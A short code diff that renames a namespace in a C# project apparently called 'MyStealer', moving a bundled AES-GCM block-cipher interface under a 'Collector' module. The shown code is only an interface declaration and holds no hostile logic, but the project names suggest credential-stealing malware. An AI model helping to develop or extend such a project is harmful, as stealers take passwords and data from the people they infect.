@@ -1,4 +1,4 @@
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     /// <remarks>Base interface for a symmetric key block cipher.</remarks>
     public interface IBlockCipher
